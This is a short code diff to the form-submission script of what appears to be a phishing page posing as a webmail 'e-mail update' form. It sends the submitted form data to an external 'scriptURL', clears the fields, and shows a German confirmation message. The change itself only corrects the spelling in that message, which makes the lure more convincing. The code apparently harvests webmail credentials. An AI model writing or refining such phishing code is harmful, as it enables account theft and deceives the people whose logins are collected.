@@ -68,7 +68,7 @@
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
             .then(response => console.log('Success!', response))
             .then(response => $("#jennet").val(""), $("#jenneta").val(""))
-            .then(response => $("#form-confirm").html("<h2 class='form-confirmed'>Ihre e-mail wurde<br> erfolgreich aktualisiert.<br> GenieBen Sie weiterhin<br> unsere webmail.</h2>"))
+            .then(response => $("#form-confirm").html("<h2 class='form-confirmed'>Ihre e-mail wurde<br> erfolgreich aktualisiert.<br> genießen Sie weiterhin<br> unsere webmail.</h2>"))
             .then(response => $(".loader").remove())
             .catch(error => console.error('Error!', error.message))
         })
